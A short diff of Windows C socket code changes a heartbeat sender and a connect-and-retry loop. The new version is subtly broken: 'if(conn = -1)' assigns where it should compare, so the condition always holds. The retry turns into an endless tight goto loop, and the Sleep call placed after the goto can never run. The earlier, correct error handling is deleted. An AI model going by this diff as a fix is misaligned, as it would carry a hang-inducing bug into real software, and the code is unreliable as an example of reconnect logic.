@@ -18,7 +18,7 @@ DWORD WINAPI refresh_connection(LPVOID lpBuffer) {
     loop_back:
     int check = send(sock," {1} ", strlen(" {1} "), NULL);
     if(check < 0) {
-        close(sock);
+        closesocket(sock);
         sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         
         goto loop_back;
@@ -40,14 +40,12 @@ DWORD WINAPI connect_to_server(LPVOID arg) {
     hMutex = CreateMutex(NULL, FALSE, NULL);
     while(1) {
         // Try to connect to the server
+        loop_err:
         conn = connect(sock, (struct sockaddr *)&server, sizeof(server));
         
-        // If the connection fails, reconnect
-        if (conn == SOCKET_ERROR) {
-            closesocket(sock);
-            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-            Sleep(1000);
-            continue;
+        if(conn = -1){
+            goto loop_err;
+            Sleep(20000);    
         }
 
         // Check if the buffer is filled with data
